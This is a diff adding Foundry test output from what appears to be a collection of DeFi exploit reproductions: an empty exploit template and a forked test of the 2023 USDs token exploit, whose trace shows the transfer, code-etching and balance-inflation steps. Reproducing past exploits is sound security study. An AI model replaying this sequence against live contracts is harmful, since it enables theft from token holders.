@@ -1,0 +1,54 @@
+Compiling 27 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.04s
+Compiler run successful!
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 358.57ms (1.07ms CPU time)
+
+Ran 1 test for src/test/2023-02/USDs_exp.sol:USDsTest
+[PASS] testExploit() (gas: 131948)
+Logs:
+  Attacker Contract balance after:  9797854216567803995021828645
+
+Traces:
+  [131948] AttackerAddress::testExploit()
+    ├─ [82698] USDs::transfer(AttackerContract: [0x00000000000000000000000000000000DeaDBeef], 11000000000000000000 [1.1e19])
+    │   ├─ [75386] USDsImpl::transfer(AttackerContract: [0x00000000000000000000000000000000DeaDBeef], 11000000000000000000 [1.1e19]) [delegatecall]
+    │   │   ├─  emit topic 0: 0x08fa806bd030445e8e404bce43cba31d6e73d90c55137f78740e2209973be75d
+    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000deadbeef0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Transfer(from: AttackerAddress: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: AttackerContract: [0x00000000000000000000000000000000DeaDBeef], value: 11000000000000000000 [1.1e19])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [0] VM::etch(AttackerContract: [0x00000000000000000000000000000000DeaDBeef], 0x636f6465)
+    │   └─ ← [Return] 
+    ├─ [0] VM::prank(AttackerContract: [0x00000000000000000000000000000000DeaDBeef])
+    │   └─ ← [Return] 
+    ├─ [31471] USDs::transfer(AttackerAddress: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   ├─ [30659] USDsImpl::transfer(AttackerAddress: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
+    │   │   ├─ emit Transfer(from: AttackerContract: [0x00000000000000000000000000000000DeaDBeef], to: AttackerAddress: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [2192] USDs::balanceOf(AttackerContract: [0x00000000000000000000000000000000DeaDBeef])
+    │   ├─ [1383] USDsImpl::balanceOf(AttackerContract: [0x00000000000000000000000000000000DeaDBeef]) [delegatecall]
+    │   │   └─ ← [Return] 9797854216567803995021828645 [9.797e27]
+    │   └─ ← [Return] 9797854216567803995021828645 [9.797e27]
+    ├─ [0] console::log("Attacker Contract balance after: ", 9797854216567803995021828645 [9.797e27]) [staticcall]
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 360.80ms (999.60µs CPU time)
+
+Ran 2 test suites in 613.11ms (719.37ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
